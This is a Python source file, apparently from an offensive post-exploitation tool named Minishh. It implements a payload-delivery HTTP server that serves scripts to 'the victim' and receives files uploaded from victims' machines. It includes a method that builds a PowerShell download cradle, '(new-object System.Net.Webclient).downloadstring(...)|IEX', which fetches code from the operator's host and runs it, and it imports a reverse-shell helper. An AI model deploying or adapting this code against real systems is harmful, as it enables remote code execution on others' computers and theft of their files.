from http.server import BaseHTTPRequestHandler, HTTPServer
from http import HTTPStatus
from enum import Enum, auto
from threading import Thread, Event
from requests_toolbelt.multipart import decoder
import os
import requests
from utils.minishh_utils import MinishhUtils
from utils.pwsh_utils import ReverseShell
from utils.print_utils import Printer
from config.config import AppConfig

class ServerStatus(Enum):
    Running = auto()
    Stopped = auto()

class HttpDeliveringServer(BaseHTTPRequestHandler):

    files_to_deliver = {"tmp_routes": {}, "permanent_routes": {}}
    files_to_receive = {}

    def __init__(self, *args, **kwargs):
        self.server_version = "MinishhHttp/0.8"
        self.sys_version = ''
        super().__init__(*args, **kwargs)

    @classmethod
    def notify_upload(cls, route, filename):
        cls.files_to_receive[route] = filename

    @classmethod
    def remove_file_upload(cls, route):
        if route in cls.files_to_receive:
            del cls.files_to_receive[route]

    @classmethod
    def notify_download(cls, route, filename):
        cls.files_to_deliver["tmp_routes"][route] = filename

    @classmethod
    def remove_file(cls, route):
        if route in cls.files_to_deliver["tmp_routes"]:
            del cls.files_to_deliver["tmp_routes"][route]

    @classmethod
    def init_permanent_route(cls, routes):
        cls.files_to_deliver["permanent_routes"] = routes

    @classmethod
    def add_permanent_route(cls, route, file):
        cls.files_to_deliver["permanent_routes"][route] = file

    @classmethod
    def get_route_for_script(cls, script_name):
        for k,v in cls.files_to_deliver["permanent_routes"].items():
            if v == script_name:
                return k
        return None

    def do_GET(self):
        filename = None
        self.path = self.path.lstrip("/")
        if self.path in HttpDeliveringServer.files_to_deliver["tmp_routes"]:
            filename = HttpDeliveringServer.files_to_deliver["tmp_routes"].get(self.path)
        else:
            filename = HttpDeliveringServer.files_to_deliver["permanent_routes"].get(self.path)

        if(filename is not None and os.path.isfile(filename)):
            content = b""
            with open(filename, "rb") as file:
                content = file.read()

            self.send_response(HTTPStatus.OK)
            self.end_headers()

            self.wfile.write(content)

            # Once download done, remove the file from the temp route
            self.remove_file(self.path)

        else:
            self.send_response(HTTPStatus.NOT_FOUND)
            self.end_headers()

    def do_POST(self):
        """
        Method allowing file transfer between minishh server and the victim
        This method download file from post method

        It works with and without multipart
        """
        try:
            content_type = self.headers.get("Content-Type")
            post_request = self.rfile.read1()
            filename = HttpDeliveringServer.files_to_receive.get(self.path.lstrip("/"))
            if (content_type is not None and 'boundary=' in content_type and filename != ""):
                multipart_data = decoder.MultipartDecoder(post_request, content_type)
                for part in multipart_data.parts:
                    # Do save file
                    MinishhUtils.save_file(filename, part.content)
                    break

                self.send_response(HTTPStatus.OK)
                self.end_headers()

            elif len(post_request) > 0:
                self.send_response(HTTPStatus.OK)
                self.end_headers()
                MinishhUtils.save_file(filename, post_request)

            else:
                self.send_response(HTTPStatus.NOT_FOUND)
                self.end_headers()

            self.remove_file_upload(self.path.lstrip("/"))

        except Exception as e:
            Printer.err(e)
            pass

    def log_message(self, format, request_proto, status_code, *args):
        splited_req = request_proto.split()
        verb = splited_req[0]
        route = request_proto
        if len(splited_req) >= 2:
            route = splited_req[1]

        if(int(status_code) == HTTPStatus.OK and verb == "GET"):
            Printer.log(f'File downloaded successfully from {self.address_string()} -->  [yellow]{route}[/yellow]')


class HttpServer(Thread):
    """
    Class responsible for building payload and creating route for futur download
    """
    def __init__(self):
        super().__init__(name="HttpServerThread")
        self.host = AppConfig.get("host", "HttpServer")
        self.port = int(AppConfig.get("port", "HttpServer"))
        self.server_status = ServerStatus.Stopped
        self.has_started = Event()

    def __str__(self):
        return f"HttpServer(port={self.port}, status={self.server_status.name})"

    def notify_download(self, route, filename):
        if self.server_status == ServerStatus.Running:
            HttpDeliveringServer.notify_download(route, filename)
        else:
            Printer.err("Http server is not running...")

    def add_permanent_route(self, route, script_name):
        HttpDeliveringServer.add_permanent_route(route, script_name)

    def download_link_powershell(self, route):
        http_route = self.create_download_link(route)
        return f"""(new-object System.Net.Webclient).downloadstring("{http_route}")|IEX"""

    @classmethod
    def create_download_link(cls, route):
        ip_addr = AppConfig.get("default_ip_address")
        port = AppConfig.get("port", "HttpServer")
        return f'http://{ip_addr}:{port}/{route}'

    def end_download(self, route):
        HttpDeliveringServer.remove_file(route)

    @property
    def is_listening(self):
        return self.server_status == ServerStatus.Running

    def stop_listening(self):
        self.server_status = ServerStatus.Stopped
        try:
            requests.get(f"http://{self.host}:{str(self.port)}", timeout=1)
        except:
            pass

    def run(self):
        try:
            httpd = HTTPServer((self.host, self.port), HttpDeliveringServer)
            self.server_status = ServerStatus.Running
            Printer.log(f"Http server started on port {self.port}")

        except Exception as e:
            self.server_status = ServerStatus.Stopped
            Printer.err(e)

        finally:
            self.has_started.set()

        while(self.server_status == ServerStatus.Running):
            httpd.handle_request()
